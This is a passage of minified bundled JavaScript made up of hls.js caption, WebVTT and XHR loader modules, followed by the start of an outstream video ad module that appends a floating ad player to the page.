Memory"),this.nonDisplayedMemory.reset()},e.prototype.ccEOC=function(){if(f.log("INFO","EOC - End Of Caption"),"MODE_POP-ON"===this.mode){var e=this.displayedMemory;this.displayedMemory=this.nonDisplayedMemory,this.nonDisplayedMemory=e,this.writeScreen=this.nonDisplayedMemory,f.log("TEXT","DISP: "+this.displayedMemory.getDisplayText())}this.outputDataUpdate(!0)},e.prototype.ccTO=function(e){f.log("INFO","TO("+e+") - Tab Offset"),this.writeScreen.moveCursor(e)},e.prototype.ccMIDROW=function(e){var t={flash:!1};if(t.underline=e%2==1,t.italics=e>=46,t.italics)t.foreground="white";else{var r=Math.floor(e/2)-16;t.foreground=["white","green","blue","cyan","red","yellow","magenta"][r]}f.log("INFO","MIDROW: "+JSON.stringify(t)),this.writeScreen.setPen(t)},e.prototype.outputDataUpdate=function(e){void 0===e&&(e=!1);var t=f.time;null!==t&&this.outputFilter&&(null!==this.cueStartTime||this.displayedMemory.isEmpty()?this.displayedMemory.equals(this.lastOutputScreen)||(this.outputFilter.newCue&&(this.outputFilter.newCue(this.cueStartTime,t,this.lastOutputScreen),!0===e&&this.outputFilter.dispatchCue&&this.outputFilter.dispatchCue()),this.cueStartTime=this.displayedMemory.isEmpty()?null:t):this.cueStartTime=t,this.lastOutputScreen.copy(this.displayedMemory))},e.prototype.cueSplitAtTime=function(e){this.outputFilter&&(this.displayedMemory.isEmpty()||(this.outputFilter.newCue&&this.outputFilter.newCue(this.cueStartTime,e,this.displayedMemory),this.cueStartTime=e))},e}(),L=function(){function e(e,t,r){this.field=e||1,this.outputs=[t,r],this.channels=[new m(1,t),new m(2,r)],this.currChNr=-1,this.lastCmdA=null,this.lastCmdB=null,this.bufferedData=[],this.startTime=null,this.lastTime=null,this.dataCounters={padding:0,char:0,cmd:0,other:0}}return e.prototype.getHandler=function(e){return this.channels[e].getHandler()},e.prototype.setHandler=function(e,t){this.channels[e].setHandler(t)},e.prototype.addData=function(e,t){var r,i,n,a=!1;this.lastTime=e,f.setTime(e);for(var s=0;s<t.length;s+=2)if(i=127&t[s],n=127&t[s+1],0!==i||0!==n){if(f.log("DATA","["+h([t[s],t[s+1]])+"] -> ("+h([i,n])+")"),(r=this.parseCmd(i,n))||(r=this.parseMidrow(i,n)),r||(r=this.parsePAC(i,n)),r||(r=this.parseBackgroundAttributes(i,n)),!r)if(a=this.parseChars(i,n))if(this.currChNr&&this.currChNr>=0)this.channels[this.currChNr-1].insertChars(a);else f.log("WARNING","No channel found yet. TEXT-MODE?");r?this.dataCounters.cmd+=2:a?this.dataCounters.char+=2:(this.dataCounters.other+=2,f.log("WARNING","Couldn't parse cleaned data "+h([i,n])+" orig: "+h([t[s],t[s+1]])))}else this.dataCounters.padding+=2},e.prototype.parseCmd=function(e,t){var r=null;if(!((20===e||28===e)&&t>=32&&t<=47)&&!((23===e||31===e)&&t>=33&&t<=35))return!1;if(e===this.lastCmdA&&t===this.lastCmdB)return this.lastCmdA=null,this.lastCmdB=null,f.log("DEBUG","Repeated command ("+h([e,t])+") is dropped"),!0;r=20===e||23===e?1:2;var i=this.channels[r-1];return 20===e||28===e?32===t?i.ccRCL():33===t?i.ccBS():34===t?i.ccAOF():35===t?i.ccAON():36===t?i.ccDER():37===t?i.ccRU(2):38===t?i.ccRU(3):39===t?i.ccRU(4):40===t?i.ccFON():41===t?i.ccRDC():42===t?i.ccTR():43===t?i.ccRTD():44===t?i.ccEDM():45===t?i.ccCR():46===t?i.ccENM():47===t&&i.ccEOC():i.ccTO(t-32),this.lastCmdA=e,this.lastCmdB=t,this.currChNr=r,!0},e.prototype.parseMidrow=function(e,t){var r=null;return(17===e||25===e)&&t>=32&&t<=47&&((r=17===e?1:2)!==this.currChNr?(f.log("ERROR","Mismatch channel in midrow parsing"),!1):(this.channels[r-1].ccMIDROW(t),f.log("DEBUG","MIDROW ("+h([e,t])+")"),!0))},e.prototype.parsePAC=function(e,t){var r,i=null;if(!((e>=17&&e<=23||e>=25&&e<=31)&&t>=64&&t<=127)&&!((16===e||24===e)&&t>=64&&t<=95))return!1;if(e===this.lastCmdA&&t===this.lastCmdB)return this.lastCmdA=null,this.lastCmdB=null,!0;r=e<=23?1:2,i=t>=64&&t<=95?1===r?o[e]:l[e]:1===r?u[e]:c[e];var n=this.interpretPAC(i,t);return this.channels[r-1].setPAC(n),this.lastCmdA=e,this.lastCmdB=t,this.currChNr=r,!0},e.prototype.interpretPAC=function(e,t){var r=t,i={color:null,italics:!1,indent:null,underline:!1,row:e};return r=t>95?t-96:t-64,i.underline=1==(1&r),r<=13?i.color=["white","green","blue","cyan","red","yellow","magenta","white"][Math.floor(r/2)]:r<=15?(i.italics=!0,i.color="white"):i.indent=4*Math.floor((r-16)/2),i},e.prototype.parseChars=function(e,t){var r=null,i=null,a=null;if(e>=25?(r=2,a=e-8):(r=1,a=e),a>=17&&a<=19){var s=t;s=17===a?t+80:18===a?t+112:t+144,f.log("INFO","Special char '"+n(s)+"' in channel "+r),i=[s]}else e>=32&&e<=127&&(i=0===t?[e]:[e,t]);if(i){var o=h(i);f.log("DEBUG","Char codes =  "+o.join(",")),this.lastCmdA=null,this.lastCmdB=null}return i},e.prototype.parseBackgroundAttributes=function(e,t){var r,i,n;return((16===e||24===e)&&t>=32&&t<=47||(23===e||31===e)&&t>=45&&t<=47)&&(r={},16===e||24===e?(i=Math.floor((t-32)/2),r.background=d[i],t%2==1&&(r.background=r.background+"_semi")):45===t?r.background="transparent":(r.foreground="black",47===t&&(r.underline=!0)),n=e<24?1:2,this.channels[n-1].setBkgData(r),this.lastCmdA=null,this.lastCmdB=null,!0)},e.prototype.reset=function(){for(var e=0;e<this.channels.length;e++)this.channels[e]&&this.channels[e].reset();this.lastCmdA=null,this.lastCmdB=null},e.prototype.cueSplitAtTime=function(e){for(var t=0;t<this.channels.length;t++)this.channels[t]&&this.channels[t].cueSplitAtTime(e)},e}();t.default=L},"./src/utils/codecs.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i={audio:{a3ds:!0,"ac-3":!0,"ac-4":!0,alac:!0,alaw:!0,dra1:!0,"dts+":!0,"dts-":!0,dtsc:!0,dtse:!0,dtsh:!0,"ec-3":!0,enca:!0,g719:!0,g726:!0,m4ae:!0,mha1:!0,mha2:!0,mhm1:!0,mhm2:!0,mlpa:!0,mp4a:!0,"raw ":!0,Opus:!0,samr:!0,sawb:!0,sawp:!0,sevc:!0,sqcp:!0,ssmv:!0,twos:!0,ulaw:!0},video:{avc1:!0,avc2:!0,avc3:!0,avc4:!0,avcp:!0,drac:!0,dvav:!0,dvhe:!0,encv:!0,hev1:!0,hvc1:!0,mjp2:!0,mp4v:!0,mvc1:!0,mvc2:!0,mvc3:!0,mvc4:!0,resv:!0,rv60:!0,s263:!0,svc1:!0,svc2:!0,"vc-1":!0,vp08:!0,vp09:!0}};t.isCodecType=function(e,t){var r=i[t];return!!r&&!0===r[e.slice(0,4)]},t.isCodecSupportedInMp4=function(e,t){return window.MediaSource.isTypeSupported((t||"video")+'/mp4;codecs="'+e+'"')}},"./src/utils/cues.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=r("./src/utils/vttparser.js");t.newCue=function(e,t,r,n){for(var a,s,o,u,l,c=window.VTTCue||window.TextTrackCue,d=0;d<n.rows.length;d++)if(o=!0,u=0,l="",!(a=n.rows[d]).isEmpty()){for(var f=0;f<a.chars.length;f++)a.chars[f].uchar.match(/\s/)&&o?u++:(l+=a.chars[f].uchar,o=!1);a.cueStartTime=t,t===r&&(r+=1e-4),s=new c(t,r,i.fixLineBreaks(l.trim())),u>=16?u--:u++,navigator.userAgent.match(/Firefox\//)?s.line=d+1:s.line=d>7?d-2:d+1,s.align="left",s.position=Math.max(0,Math.min(100,u/32*100+(navigator.userAgent.match(/Firefox\//)?50:0))),e.addCue(s)}}},"./src/utils/discontinuities.js":function(e,t,r){"use strict";(function(e){Object.defineProperty(t,"__esModule",{value:!0});var i=r("./src/utils/binary-search.js"),n=r("./src/utils/logger.js");function a(e,t){for(var r=null,i=0;i<e.length;i+=1){var n=e[i];if(n&&n.cc===t){r=n;break}}return r}function s(e,t,r){var i=!1;return t&&t.details&&r&&(r.endCC>r.startCC||e&&e.cc<r.startCC)&&(i=!0),i}function o(e,t){var r=e.fragments,i=t.fragments;if(i.length&&r.length){var s=a(r,i[0].cc);if(s&&(!s||s.startPTS))return s;n.logger.log("No frag in previous level to align on")}else n.logger.log("No fragments to align")}function u(e,t){t.fragments.forEach(function(t){if(t){var r=t.start+e;t.start=t.startPTS=r,t.endPTS=r+t.duration}}),t.PTSKnown=!0}function l(e,t,r){if(s(e,r,t)){var i=o(r.details,t);i&&(n.logger.log("Adjusting PTS using last level due to CC increase within current level"),u(i.start,t))}}function c(t,r){if(r&&r.fragments.length){if(!t.hasProgramDateTime||!r.hasProgramDateTime)return;var i=r.fragments[0].programDateTime,a=(t.fragments[0].programDateTime-i)/1e3+r.fragments[0].start;e.isFinite(a)&&(n.logger.log("adjusting PTS using programDateTime delta, sliding:"+a.toFixed(3)),u(a,t))}}t.findFirstFragWithCC=a,t.findFragWithCC=function(e,t){return i.default.search(e,function(e){return e.cc<t?1:e.cc>t?-1:0})},t.shouldAlignOnDiscontinuities=s,t.findDiscontinuousReferenceFrag=o,t.adjustPts=u,t.alignStream=function(e,t,r){l(e,r,t),!r.PTSKnown&&t&&c(r,t.details)},t.alignDiscontinuities=l,t.alignPDT=c}).call(this,r("./src/polyfills/number.js").Number)},"./src/utils/ewma-bandwidth-estimator.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=r("./src/utils/ewma.js"),n=function(){function e(e,t,r,n){this.hls=e,this.defaultEstimate_=n,this.minWeight_=.001,this.minDelayMs_=50,this.slow_=new i.default(t),this.fast_=new i.default(r)}return e.prototype.sample=function(e,t){var r=8e3*t/(e=Math.max(e,this.minDelayMs_)),i=e/1e3;this.fast_.sample(i,r),this.slow_.sample(i,r)},e.prototype.canEstimate=function(){var e=this.fast_;return e&&e.getTotalWeight()>=this.minWeight_},e.prototype.getEstimate=function(){return this.canEstimate()?Math.min(this.fast_.getEstimate(),this.slow_.getEstimate()):this.defaultEstimate_},e.prototype.destroy=function(){},e}();t.default=n},"./src/utils/ewma.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=function(){function e(e){this.alpha_=e?Math.exp(Math.log(.5)/e):0,this.estimate_=0,this.totalWeight_=0}return e.prototype.sample=function(e,t){var r=Math.pow(this.alpha_,e);this.estimate_=t*(1-r)+r*this.estimate_,this.totalWeight_+=e},e.prototype.getTotalWeight=function(){return this.totalWeight_},e.prototype.getEstimate=function(){if(this.alpha_){var e=1-Math.pow(this.alpha_,this.totalWeight_);return this.estimate_/e}return this.estimate_},e}();t.default=i},"./src/utils/get-self-scope.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t.getSelfScope=function(){return"undefined"==typeof window?self:window}},"./src/utils/logger.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=r("./src/utils/get-self-scope.js");function n(){}var a={trace:n,debug:n,log:n,warn:n,info:n,error:n},s=a;var o=i.getSelfScope();function u(e){for(var t=[],r=1;r<arguments.length;r++)t[r-1]=arguments[r];t.forEach(function(t){s[t]=e[t]?e[t].bind(e):function(e){var t=o.console[e];return t?function(){for(var r=[],i=0;i<arguments.length;i++)r[i]=arguments[i];r[0]&&(r[0]=function(e,t){return t="["+e+"] > "+t}(e,r[0])),t.apply(o.console,r)}:n}(t)})}t.enableLogs=function(e){if(!0===e||"object"==typeof e){u(e,"debug","log","info","warn","error");try{s.log()}catch(e){s=a}}else s=a},t.logger=s},"./src/utils/mediakeys-helper.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i="undefined"!=typeof window&&window.navigator&&window.navigator.requestMediaKeySystemAccess?window.navigator.requestMediaKeySystemAccess.bind(window.navigator):null;t.requestMediaKeySystemAccess=i},"./src/utils/mediasource-helper.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t.getMediaSource=function(){if("undefined"!=typeof window)return window.MediaSource||window.WebKitMediaSource}},"./src/utils/output-filter.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=function(){function e(e,t){this.timelineController=e,this.trackName=t,this.startTime=null,this.endTime=null,this.screen=null}return e.prototype.dispatchCue=function(){null!==this.startTime&&(this.timelineController.addCues(this.trackName,this.startTime,this.endTime,this.screen),this.startTime=null)},e.prototype.newCue=function(e,t,r){(null===this.startTime||this.startTime>e)&&(this.startTime=e),this.endTime=t,this.screen=r,this.timelineController.createCaptionsTrack(this.trackName)},e}();t.default=i},"./src/utils/texttrack-utils.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t.sendAddTrackEvent=function(e,t){var r=null;try{r=new window.Event("addtrack")}catch(e){(r=document.createEvent("Event")).initEvent("addtrack",!1,!1)}r.track=e,t.dispatchEvent(r)},t.clearCurrentCues=function(e){if(e&&e.cues)for(;e.cues.length>0;)e.removeCue(e.cues[0])}},"./src/utils/time-ranges.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});t.default={toString:function(e){for(var t="",r=e.length,i=0;i<r;i++)t+="["+e.start(i).toFixed(3)+","+e.end(i).toFixed(3)+"]";return t}}},"./src/utils/vttcue.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t.default=function(){if("undefined"!=typeof window&&window.VTTCue)return window.VTTCue;var e="auto",t={"":!0,lr:!0,rl:!0},r={start:!0,middle:!0,end:!0,left:!0,right:!0};function i(e){return"string"==typeof e&&(!!r[e.toLowerCase()]&&e.toLowerCase())}function n(e){for(var t=1;t<arguments.length;t++){var r=arguments[t];for(var i in r)e[i]=r[i]}return e}function a(r,a,s){var o=this,u=function(){if("undefined"!=typeof navigator)return/MSIE\s8\.0/.test(navigator.userAgent)}(),l={};u?o=document.createElement("custom"):l.enumerable=!0,o.hasBeenReset=!1;var c="",d=!1,f=r,h=a,p=s,g=null,y="",v=!0,m="auto",L="start",M=50,T="middle",A=50,w="middle";if(Object.defineProperty(o,"id",n({},l,{get:function(){return c},set:function(e){c=""+e}})),Object.defineProperty(o,"pauseOnExit",n({},l,{get:function(){return d},set:function(e){d=!!e}})),Object.defineProperty(o,"startTime",n({},l,{get:function(){return f},set:function(e){if("number"!=typeof e)throw new TypeError("Start time must be set to a number.");f=e,this.hasBeenReset=!0}})),Object.defineProperty(o,"endTime",n({},l,{get:function(){return h},set:function(e){if("number"!=typeof e)throw new TypeError("End time must be set to a number.");h=e,this.hasBeenReset=!0}})),Object.defineProperty(o,"text",n({},l,{get:function(){return p},set:function(e){p=""+e,this.hasBeenReset=!0}})),Object.defineProperty(o,"region",n({},l,{get:function(){return g},set:function(e){g=e,this.hasBeenReset=!0}})),Object.defineProperty(o,"vertical",n({},l,{get:function(){return y},set:function(e){var r=function(e){return"string"==typeof e&&!!t[e.toLowerCase()]&&e.toLowerCase()}(e);if(!1===r)throw new SyntaxError("An invalid or illegal string was specified.");y=r,this.hasBeenReset=!0}})),Object.defineProperty(o,"snapToLines",n({},l,{get:function(){return v},set:function(e){v=!!e,this.hasBeenReset=!0}})),Object.defineProperty(o,"line",n({},l,{get:function(){return m},set:function(t){if("number"!=typeof t&&t!==e)throw new SyntaxError("An invalid number or illegal string was specified.");m=t,this.hasBeenReset=!0}})),Object.defineProperty(o,"lineAlign",n({},l,{get:function(){return L},set:function(e){var t=i(e);if(!t)throw new SyntaxError("An invalid or illegal string was specified.");L=t,this.hasBeenReset=!0}})),Object.defineProperty(o,"position",n({},l,{get:function(){return M},set:function(e){if(e<0||e>100)throw new Error("Position must be between 0 and 100.");M=e,this.hasBeenReset=!0}})),Object.defineProperty(o,"positionAlign",n({},l,{get:function(){return T},set:function(e){var t=i(e);if(!t)throw new SyntaxError("An invalid or illegal string was specified.");T=t,this.hasBeenReset=!0}})),Object.defineProperty(o,"size",n({},l,{get:function(){return A},set:function(e){if(e<0||e>100)throw new Error("Size must be between 0 and 100.");A=e,this.hasBeenReset=!0}})),Object.defineProperty(o,"align",n({},l,{get:function(){return w},set:function(e){var t=i(e);if(!t)throw new SyntaxError("An invalid or illegal string was specified.");w=t,this.hasBeenReset=!0}})),o.displayState=void 0,u)return o}return a.prototype.getCueAsHTML=function(){return window.WebVTT.convertCueToDOMTree(window,this.text)},a}()},"./src/utils/vttparser.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=r("./src/utils/vttcue.js"),n=function(){return{decode:function(e){if(!e)return"";if("string"!=typeof e)throw new Error("Error - expected string data.");return decodeURIComponent(encodeURIComponent(e))}}};function a(){this.window=window,this.state="INITIAL",this.buffer="",this.decoder=new n,this.regionList=[]}function s(){this.values=Object.create(null)}function o(e,t,r,i){var n=i?e.split(i):[e];for(var a in n)if("string"==typeof n[a]){var s=n[a].split(r);if(2===s.length)t(s[0],s[1])}}s.prototype={set:function(e,t){this.get(e)||""===t||(this.values[e]=t)},get:function(e,t,r){return r?this.has(e)?this.values[e]:t[r]:this.has(e)?this.values[e]:t},has:function(e){return e in this.values},alt:function(e,t,r){for(var i=0;i<r.length;++i)if(t===r[i]){this.set(e,t);break}},integer:function(e,t){/^-?\d+$/.test(t)&&this.set(e,parseInt(t,10))},percent:function(e,t){return!!(t.match(/^([\d]{1,3})(\.[\d]*)?%$/)&&(t=parseFloat(t))>=0&&t<=100)&&(this.set(e,t),!0)}};var u=new i.default(0,0,0),l="middle"===u.align?"middle":"center";function c(e,t,r){var i=e;function n(){var t=function(e){function t(e,t,r,i){return 3600*(0|e)+60*(0|t)+(0|r)+(0|i)/1e3}var r=e.match(/^(\d+):(\d{2})(:\d{2})?\.(\d{3})/);return r?r[3]?t(r[1],r[2],r[3].replace(":",""),r[4]):r[1]>59?t(r[1],r[2],0,r[4]):t(0,r[1],r[2],r[4]):null}(e);if(null===t)throw new Error("Malformed timestamp: "+i);return e=e.replace(/^[^\sa-zA-Z-]+/,""),t}function a(){e=e.replace(/^\s+/,"")}if(a(),t.startTime=n(),a(),"--\x3e"!==e.substr(0,3))throw new Error("Malformed time stamp (time stamps must be separated by '--\x3e'): "+i);e=e.substr(3),a(),t.endTime=n(),a(),function(e,t){var i=new s;o(e,function(e,t){switch(e){case"region":for(var n=r.length-1;n>=0;n--)if(r[n].id===t){i.set(e,r[n].region);break}break;case"vertical":i.alt(e,t,["rl","lr"]);break;case"line":var a=t.split(","),s=a[0];i.integer(e,s),i.percent(e,s)&&i.set("snapToLines",!1),i.alt(e,s,["auto"]),2===a.length&&i.alt("lineAlign",a[1],["start",l,"end"]);break;case"position":a=t.split(","),i.percent(e,a[0]),2===a.length&&i.alt("positionAlign",a[1],["start",l,"end","line-left","line-right","auto"]);break;case"size":i.percent(e,t);break;case"align":i.alt(e,t,["start",l,"end","left","right"])}},/:/,/\s/),t.region=i.get("region",null),t.vertical=i.get("vertical","");var n=i.get("line","auto");"auto"===n&&-1===u.line&&(n=-1),t.line=n,t.lineAlign=i.get("lineAlign","start"),t.snapToLines=i.get("snapToLines",!0),t.size=i.get("size",100),t.align=i.get("align",l);var a=i.get("position","auto");"auto"===a&&50===u.position&&(a="start"===t.align||"left"===t.align?0:"end"===t.align||"right"===t.align?100:50),t.position=a}(e,t)}function d(e){return e.replace(/<br(?: \/)?>/gi,"\n")}t.fixLineBreaks=d,a.prototype={parse:function(e){var t=this;function r(){var e=t.buffer,r=0;for(e=d(e);r<e.length&&"\r"!==e[r]&&"\n"!==e[r];)++r;var i=e.substr(0,r);return"\r"===e[r]&&++r,"\n"===e[r]&&++r,t.buffer=e.substr(r),i}e&&(t.buffer+=t.decoder.decode(e,{stream:!0}));try{var n=void 0;if("INITIAL"===t.state){if(!/\r\n|\n/.test(t.buffer))return this;var a=(n=r()).match(/^(Ã¯Â»Â¿)?WEBVTT([ \t].*)?$/);if(!a||!a[0])throw new Error("Malformed WebVTT signature.");t.state="HEADER"}for(var s=!1;t.buffer;){if(!/\r\n|\n/.test(t.buffer))return this;switch(s?s=!1:n=r(),t.state){case"HEADER":/:/.test(n)?o(n,function(e,t){},/:/):n||(t.state="ID");continue;case"NOTE":n||(t.state="ID");continue;case"ID":if(/^NOTE($|[ \t])/.test(n)){t.state="NOTE";break}if(!n)continue;if(t.cue=new i.default(0,0,""),t.state="CUE",-1===n.indexOf("--\x3e")){t.cue.id=n;continue}case"CUE":try{c(n,t.cue,t.regionList)}catch(e){t.cue=null,t.state="BADCUE";continue}t.state="CUETEXT";continue;case"CUETEXT":var u=-1!==n.indexOf("--\x3e");if(!n||u&&(s=!0)){t.oncue&&t.oncue(t.cue),t.cue=null,t.state="ID";continue}t.cue.text&&(t.cue.text+="\n"),t.cue.text+=n;continue;case"BADCUE":n||(t.state="ID");continue}}}catch(e){"CUETEXT"===t.state&&t.cue&&t.oncue&&t.oncue(t.cue),t.cue=null,t.state="INITIAL"===t.state?"BADWEBVTT":"BADCUE"}return this},flush:function(){try{if(this.buffer+=this.decoder.decode(),(this.cue||"HEADER"===this.state)&&(this.buffer+="\n\n",this.parse()),"INITIAL"===this.state)throw new Error("Malformed WebVTT signature.")}catch(e){throw e}return this.onflush&&this.onflush(),this}},t.default=a},"./src/utils/webvtt-parser.js":function(e,t,r){"use strict";(function(e){Object.defineProperty(t,"__esModule",{value:!0});var i=r("./src/utils/vttparser.js"),n=r("./src/demux/id3.js"),a=function(e,t,r){return e.substr(r||0,t.length)===t},s=function(e){for(var t=5381,r=e.length;r;)t=33*t^e.charCodeAt(--r);return(t>>>0).toString()},o={parse:function(t,r,o,u,l,c){var d,f=n.utf8ArrayToStr(new Uint8Array(t)).trim().replace(/\r\n|\n\r|\n|\r/g,"\n").split("\n"),h="00:00.000",p=0,g=0,y=0,v=[],m=!0,L=new i.default;L.oncue=function(e){var t=o[u],r=o.ccOffset;t&&t.new&&(void 0!==g?r=o.ccOffset=t.start:function(e,t,r){var i=e[t],n=e[i.prevCC];if(!n||!n.new&&i.new)return e.ccOffset=e.presentationOffset=i.start,void(i.new=!1);for(;n&&n.new;)e.ccOffset+=i.start-n.start,i.new=!1,n=e[(i=n).prevCC];e.presentationOffset=r}(o,u,y)),y&&(r=y-o.presentationOffset),e.startTime+=r-g,e.endTime+=r-g,e.id=s(e.startTime.toString())+s(e.endTime.toString())+s(e.text),e.text=decodeURIComponent(encodeURIComponent(e.text)),e.endTime>0&&v.push(e)},L.onparsingerror=function(e){d=e},L.onflush=function(){d&&c?c(d):l(v)},f.forEach(function(t){if(m){if(a(t,"X-TIMESTAMP-MAP=")){m=!1,t.substr(16).split(",").forEach(function(e){a(e,"LOCAL:")?h=e.substr(6):a(e,"MPEGTS:")&&(p=parseInt(e.substr(7)))});try{r+(9e4*o[u].start||0)<0&&(r+=8589934592),p-=r,i=h,n=parseInt(i.substr(-3)),s=parseInt(i.substr(-6,2)),l=parseInt(i.substr(-9,2)),c=i.length>9?parseInt(i.substr(0,i.indexOf(":"))):0,g=(e.isFinite(n)&&e.isFinite(s)&&e.isFinite(l)&&e.isFinite(c)?(n+=1e3*s,n+=6e4*l,n+=36e5*c):-1)/1e3,y=p/9e4,-1===g&&(d=new Error("Malformed X-TIMESTAMP-MAP: "+t))}catch(e){d=new Error("Malformed X-TIMESTAMP-MAP: "+t)}return}""===t&&(m=!1)}var i,n,s,l,c;L.parse(t+"\n")}),L.flush()}};t.default=o}).call(this,r("./src/polyfills/number.js").Number)},"./src/utils/xhr-loader.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=r("./src/utils/logger.js"),n=window.performance,a=window.XMLHttpRequest,s=function(){function e(e){e&&e.xhrSetup&&(this.xhrSetup=e.xhrSetup)}return e.prototype.destroy=function(){this.abort(),this.loader=null},e.prototype.abort=function(){var e=this.loader;e&&4!==e.readyState&&(this.stats.aborted=!0,e.abort()),window.clearTimeout(this.requestTimeout),this.requestTimeout=null,window.clearTimeout(this.retryTimeout),this.retryTimeout=null},e.prototype.load=function(e,t,r){this.context=e,this.config=t,this.callbacks=r,this.stats={trequest:n.now(),retry:0},this.retryDelay=t.retryDelay,this.loadInternal()},e.prototype.loadInternal=function(){var e,t=this.context;e=this.loader=new a;var r=this.stats;r.tfirst=0,r.loaded=0;var i=this.xhrSetup;try{if(i)try{i(e,t.url)}catch(r){e.open("GET",t.url,!0),i(e,t.url)}e.readyState||e.open("GET",t.url,!0)}catch(r){return void this.callbacks.onError({code:e.status,text:r.message},t,e)}t.rangeEnd&&e.setRequestHeader("Range","bytes="+t.rangeStart+"-"+(t.rangeEnd-1)),e.onreadystatechange=this.readystatechange.bind(this),e.onprogress=this.loadprogress.bind(this),e.responseType=t.responseType,this.requestTimeout=window.setTimeout(this.loadtimeout.bind(this),this.config.timeout),e.send()},e.prototype.readystatechange=function(e){var t=e.currentTarget,r=t.readyState,a=this.stats,s=this.context,o=this.config;if(!a.aborted&&r>=2)if(window.clearTimeout(this.requestTimeout),0===a.tfirst&&(a.tfirst=Math.max(n.now(),a.trequest)),4===r){var u=t.status;if(u>=200&&u<300){a.tload=Math.max(a.tfirst,n.now());var l=void 0,c=void 0;c="arraybuffer"===s.responseType?(l=t.response).byteLength:(l=t.responseText).length,a.loaded=a.total=c;var d={url:t.responseURL,data:l};this.callbacks.onSuccess(d,a,s,t)}else a.retry>=o.maxRetry||u>=400&&u<499?(i.logger.error(u+" while loading "+s.url),this.callbacks.onError({code:u,text:t.statusText},s,t)):(i.logger.warn(u+" while loading "+s.url+", retrying in "+this.retryDelay+"..."),this.destroy(),this.retryTimeout=window.setTimeout(this.loadInternal.bind(this),this.retryDelay),this.retryDelay=Math.min(2*this.retryDelay,o.maxRetryDelay),a.retry++)}else this.requestTimeout=window.setTimeout(this.loadtimeout.bind(this),o.timeout)},e.prototype.loadtimeout=function(){i.logger.warn("timeout while loading "+this.context.url),this.callbacks.onTimeout(this.stats,this.context,null)},e.prototype.loadprogress=function(e){var t=e.currentTarget,r=this.stats;r.loaded=e.loaded,e.lengthComputable&&(r.total=e.total);var i=this.callbacks.onProgress;i&&i(r,this.context,null,t)},e}();t.default=s}}).default},e.exports=i())},,,function(e,t,r){"use strict";(function(e){r.d(t,"a",function(){return a});var i=r(8),n=r(9);r(25);function a(t,r){var a=arguments.length>2&&void 0!==arguments[2]?arguments[2]:"right",s=(arguments.length>3&&arguments[3],r.video_path),o=r.link_url;null!==o&&""!==o||(o="https://adsolut.in/?utm_source=outstream&utm_medium=CPM&utm_campaign=playstream_outstream");var u=t.videoHeight,l=t.videoWidth,c=!1;return"rtl"===jQuery("html").attr("dir")&&(c=!0),new Promise(function(t,r){var d=jQuery(i);c&&d.find("#ps_ad_container").addClass("rtl"),d.width(l).height(u),d.find("#learn-more").attr({href:o,target:"_blank"}),d.find("#video_link").attr({href:o,target:"_blank"}),d.find("video source").attr("src",s),e.ps_elem=d,d.find(".on-hover").hide(),d.find("#ps_mute").show(),"left"===a?d.css({left:"20px"}):d.css({right:"20px"}),d.hide();try{jQuery("body").append(d).ready(function(r){var i=d.find("video");e.videoElem=i[0];new n.a;t({status:!0,message:"Element is ready"})})}catch(e){r(e)}})}}).call(this,r(1))},function(e,t){e.exports='<div class=playstream_floater id=ps_floater style="height:210px;width:370px;z-index:99999999999;position:fixed;bottom:20px;background-color:rgba(0,0,0,.9);box-shadow:0 4px 8px 0 rgba(0,0,0,.2),0 5px 10px 0 rgba(0,0,0,.19)"> <a href=javascript:void(0) id=video_link> <video oncontextmenu=return!1 width=100% height=100% id=ps_video muted> <source src=http://s.playstream.media/video1.mp4 type=application/vnd.apple.mpegurl> </video> </a> <div id=ps_ad_container class=ps_ad_container style=position:absolute;top:0;left:0> </div> <a id=learn-more class=on-hover role=button href=javascript:void(0) style="text-decoration:none;position:absolute;left:0;top:5px;z-index:1;background:rgba(0,0,0,.4);border:none;color:#fff;box-shadow:0 0 5px -1px gray;padding:0 10px;font-weight:bolder"> Learn More </a> <a class=cross role=button href=javascript:void(0) style="position:absolute;right:-10px;top:-30px;z-index:1;padding:0 10px"> <img 